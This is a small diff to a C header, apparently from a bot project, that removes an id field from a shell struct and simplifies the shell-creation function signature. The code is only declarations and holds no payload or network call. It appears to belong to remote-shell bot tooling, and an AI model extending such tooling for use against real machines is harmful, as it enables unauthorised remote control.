@@ -7,10 +7,9 @@ struct sLaika_bot;
 struct sLaika_shell {
     int pid;
     int fd;
-    int id;
 };
 
-struct sLaika_shell *laikaB_newShell(struct sLaika_bot *bot, int id);
+struct sLaika_shell *laikaB_newShell(struct sLaika_bot *bot);
 void laikaB_freeShell(struct sLaika_bot *bot, struct sLaika_shell *shell);
 
 /* handles reading & writing to shell pipes */
